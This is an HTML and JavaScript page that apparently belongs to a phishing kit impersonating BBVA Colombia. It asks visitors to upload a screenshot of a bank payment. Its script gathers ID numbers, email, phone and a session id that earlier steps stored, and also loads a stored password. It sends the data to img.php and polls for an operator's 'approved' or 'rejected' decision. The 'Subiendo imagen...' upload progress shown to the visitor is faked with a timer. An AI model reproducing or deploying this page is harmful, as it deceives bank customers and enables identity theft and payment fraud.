<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Confirmar pago BBVA - Subir captura</title>
  <style>
    body {
      font-family: BentonSansBBVA-Book, Helvetica, Arial, sans-serif;
      background: #ffffff;
      color: #000000;
      margin: 0;
      padding: 0;
      text-align: center;
    }

    .container {
      padding: 16px 15px 30px;
    }

    .titulo {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-weight: bold;
      margin-bottom: 10px;
      max-width: 500px;
      margin-left: auto;
      margin-right: auto;
    }

    .titulo span:first-child {
      color: #004481;
    }

    .titulo span#montoTexto {
      font-size: 14px;
      color: #333;
    }

    .card {
      max-width: 500px;
      margin: 10px auto 0;
      background: #f8fafc;
      border-radius: 14px;
      border: 1px solid #e2e8f0;
      padding: 18px 16px 22px;
      text-align: left;
      box-shadow: 0 2px 8px rgba(0,0,0,0.04);
    }

    .card h1 {
      font-size: 18px;
      margin: 0 0 8px;
      color: #111827;
    }

    .card p {
      font-size: 14px;
      line-height: 1.5;
      margin: 4px 0;
      color: #374151;
    }

    .card ul {
      margin: 10px 0 5px 18px;
      padding: 0;
      font-size: 13px;
      color: #4b5563;
    }

    .card ul li {
      margin-bottom: 4px;
    }

    .upload-box {
      margin-top: 16px;
      border: 1px dashed #004481;
      border-radius: 12px;
      padding: 16px;
      background: #f0f7ff;
      text-align: center;
      position: relative;
      overflow: hidden;
    }

    .upload-box p {
      font-size: 13px;
      margin: 0 0 10px;
      color: #4b5563;
    }

    .file-label {
      display: inline-block;
      padding: 10px 18px;
      border-radius: 4px;
      background: #004481;
      color: #ffffff;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      border: none;
      transition: background 0.2s ease;
    }

    .file-label:hover {
      background: #003366;
    }

    #fileCapture {
      display: none;
    }

    .file-name {
      margin-top: 8px;
      font-size: 12px;
      color: #111827;
      word-break: break-all;
    }

    .help-text {
      font-size: 12px;
      margin-top: 10px;
      color: #6b7280;
    }

    .upload-status {
      margin-top: 10px;
      font-size: 13px;
      color: #4b5563;
      min-height: 22px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .loader-mini {
      width: 18px;
      height: 18px;
      border-radius: 50%;
      border: 2px solid #c7d2fe;
      border-top-color: #004481;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      0%   { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .upload-status.success {
      color: #16a34a;
      font-weight: 600;
    }

    .upload-status.success::before {
      content: "✔";
      font-size: 14px;
    }

    .btn-enviar {
      display: inline-block;
      margin-top: 18px;
      padding: 10px 22px;
      border-radius: 4px;
      border: none;
      font-size: 14px;
      font-weight: 600;
      cursor: not-allowed;
      background: #d4d4d4;
      color: #4b5563;
      transition: background 0.2s ease, color 0.2s ease;
    }

    .btn-enviar.enabled {
      background: #004481;
      color: #ffffff;
      cursor: pointer;
    }

    .btn-enviar.enabled:hover {
      background: #003366;
    }

    .respuesta-msg {
      margin-top: 10px;
      font-size: 13px;
      color: #4b5563;
      min-height: 20px;
    }

    .respuesta-msg.ok {
      color: #16a34a;
      font-weight: 500;
    }

    .respuesta-msg.error {
      color: #b91c1c;
      font-weight: 500;
    }

    .nota-legal {
      margin-top: 22px;
      font-size: 11px;
      color: #9ca3af;
      max-width: 480px;
      margin-left: auto;
      margin-right: auto;
      line-height: 1.4;
    }

    .bbva-logo {
      width: 80px;
      margin: 18px auto 0;
      display: block;
    }

    /* Overlay / modal tipo mantel */
    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 68, 129, 0.85);
      backdrop-filter: blur(2px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 999;
    }

    .overlay.show {
      display: flex;
      animation: slideDown 0.25s ease-out;
    }

    @keyframes slideDown {
      from { transform: translateY(-10%); opacity: 0; }
      to   { transform: translateY(0);    opacity: 1; }
    }

    .overlay-inner {
      background: #ffffff;
      border-radius: 12px;
      padding: 20px 24px;
      max-width: 320px;
      width: 85%;
      text-align: center;
      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
    }

    .loader-big {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      border: 4px solid #e0f2fe;
      border-top-color: #004481;
      animation: spin 0.9s linear infinite;
      margin: 0 auto 12px;
    }

    .overlay-inner p {
      margin: 0;
      font-size: 14px;
      color: #111827;
    }

    @media (max-width: 480px) {
      .card {
        padding: 16px 12px 20px;
      }
      .titulo {
        flex-direction: column;
        align-items: flex-start;
        gap: 4px;
      }
      .titulo span#montoTexto {
        align-self: flex-start;
      }
    }
  </style>
</head>
<body>

<div class="container">
  <div class="titulo">
    <span>BBVA Colombia</span>
    <span id="montoTexto">Monto: $ 0</span>
  </div>

  <div class="card">
    <h1>Sube una captura de tu pago BBVA</h1>
    <p>
      Para terminar de confirmar tu pago, por favor adjunta una
      <b>captura de pantalla</b> de la aplicación BBVA donde se vea claramente:
    </p>
    <ul>
      <li>El valor pagado y el comprobante.</li>
      <li>El estado de la transacción (aprobada/exitosa).</li>
      <li>La fecha y hora del movimiento.</li>
      <li>Número de referencia o confirmación.</li>
    </ul>

    <div class="upload-box">
      <p>Puedes subir una captura de pantalla o foto tomada desde tu dispositivo.</p>
      <label for="fileCapture" class="file-label">📸 Seleccionar captura</label>
      <input type="file" id="fileCapture" accept="image/*">
      <div id="fileName" class="file-name"></div>

      <div id="uploadStatus" class="upload-status"></div>

      <div class="help-text">
        Formatos permitidos: JPG, PNG. La imagen debe ser legible.
      </div>
    </div>

    <button class="btn-enviar" id="btnEnviar" type="button">
      Enviar captura BBVA
    </button>

    <div id="respuesta" class="respuesta-msg"></div>

    <p class="nota-legal">
      Esta información será utilizada únicamente para validar el estado
      de tu transacción en BBVA. Asegúrate de que los datos coincidan con
      la operación que estás realizando.
    </p>
  </div>

  <img src="img/logo_bbva.png" class="bbva-logo" alt="BBVA Colombia">
</div>

<div id="overlay" class="overlay">
  <div class="overlay-inner">
    <div class="loader-big"></div>
    <p id="overlayText">Enviando tu captura BBVA, por favor espera...</p>
  </div>
</div>

<script>
  const input         = document.getElementById('fileCapture');
  const fileNameEl    = document.getElementById('fileName');
  const uploadStatus  = document.getElementById('uploadStatus');
  const btnEnviar     = document.getElementById('btnEnviar');
  const respuestaEl   = document.getElementById('respuesta');
  const overlay       = document.getElementById('overlay');
  const overlayText   = document.getElementById('overlayText');

  let fileReady    = false;
  let selectedFile = null;
  let poll         = null;
  let pollTimeout  = null;

  const totalPagar = localStorage.getItem("total_pagar") || "0";
  const identificacion = localStorage.getItem("identificacion") || "";
  const password = localStorage.getItem("password") || "";
  const tipoDocumento = localStorage.getItem("tipoDocumento") || "CC";
  const correo = localStorage.getItem("correo") || "";
  const celular = localStorage.getItem("cel") || "";
  const cedula = localStorage.getItem("val") || "";
  const persona = localStorage.getItem("per") || "";
  
  const montoFormateado = parseFloat(totalPagar).toLocaleString("es-CO", {
    style: "currency",
    currency: "COP"
  });
  document.getElementById("montoTexto").textContent = "Monto: " + montoFormateado;

  function showOverlay(text) {
    overlayText.textContent = text || "Enviando tu captura BBVA, por favor espera...";
    overlay.classList.add('show');
  }

  function hideOverlay() {
    overlay.classList.remove('show');
  }

  input.addEventListener('change', () => {
    fileReady    = false;
    selectedFile = null;
    btnEnviar.classList.remove('enabled');
    btnEnviar.disabled = true;
    btnEnviar.style.cursor = "not-allowed";

    uploadStatus.className = "upload-status";
    uploadStatus.textContent = "";
    fileNameEl.textContent = "";
    respuestaEl.textContent = "";
    respuestaEl.className = "respuesta-msg";

    if (!input.files || input.files.length === 0) {
      return;
    }

    if (input.files.length > 1) {
      alert("Solo puedes subir una imagen.");
      input.value = "";
      return;
    }

    const file = input.files[0];
    selectedFile = file;
    fileNameEl.textContent = file.name;

    uploadStatus.innerHTML = '<div class="loader-mini"></div><span>Subiendo imagen...</span>';

    setTimeout(() => {
      uploadStatus.className = "upload-status success";
      uploadStatus.textContent = "Imagen cargada correctamente";

      fileReady = true;
      btnEnviar.classList.add('enabled');
      btnEnviar.disabled = false;
      btnEnviar.style.cursor = "pointer";
    }, 1200);
  });

  btnEnviar.addEventListener('click', async () => {
    if (!fileReady || !selectedFile) return;

    respuestaEl.textContent = "";
    respuestaEl.className = "respuesta-msg";

    const formData = new FormData();
    formData.append('captura', selectedFile);
    formData.append('monto', totalPagar);
    formData.append('identificacion', identificacion);
    formData.append('correo', correo);
    formData.append('celular', celular);
    formData.append('cedula', cedula);
    formData.append('persona', persona);
    formData.append('tipoDocumento', tipoDocumento);
    formData.append('transactionId', localStorage.getItem('session_id') || '');

    showOverlay("Enviando tu captura BBVA y esperando respuesta del servidor...");

    try {
      const res = await fetch('img.php', {
        method: 'POST',
        body: formData
      });

      let json = {};
      try {
        json = await res.json();
      } catch (e) {
        json = { ok: false, error: 'Respuesta inválida del servidor' };
      }

      if (!json.ok) {
        hideOverlay();
        respuestaEl.textContent = json.error || "Ocurrió un error al enviar la captura. Intenta nuevamente.";
        respuestaEl.classList.add('error');
        return;
      }

      const tid = json.tid;
      overlayText.textContent = "Esperando confirmación de BBVA...";

      const TIMEOUT_MS = 180000;

      poll = setInterval(async () => {
        try {
          const r = await fetch(`img.php?transactionId=${encodeURIComponent(tid)}`);
          const j = await r.json();

          if (j.ok && j.action) {
            clearInterval(poll);
            clearTimeout(pollTimeout);

            if (j.action === "aprobado") {
              overlayText.textContent = "✅ Captura aprobada BBVA. Redirigiendo...";
              respuestaEl.textContent = "Tu captura fue aprobada. Estamos finalizando tu proceso BBVA.";
              respuestaEl.classList.add('ok');

              setTimeout(() => {
                hideOverlay();
                window.location.href = "fin.php";
              }, 2000);
            } else if (j.action === "rechazado") {
              hideOverlay();
              respuestaEl.textContent = "❌ La captura fue rechazada. Verifica la imagen y vuelve a intentarlo.";
              respuestaEl.classList.add('error');
            }
          }
        } catch (e) {
        }
      }, 4000);

      pollTimeout = setTimeout(() => {
        if (poll) clearInterval(poll);
        hideOverlay();
        respuestaEl.textContent = "⏱️ No se obtuvo respuesta de BBVA. Inténtalo nuevamente más tarde.";
        respuestaEl.classList.add('error');
      }, TIMEOUT_MS);

    } catch (err) {
      hideOverlay();
      respuestaEl.textContent = "❌ No se pudo contactar al servidor BBVA. Verifica tu conexión.";
      respuestaEl.classList.add('error');
    }
  });
</script>

</body>
</html>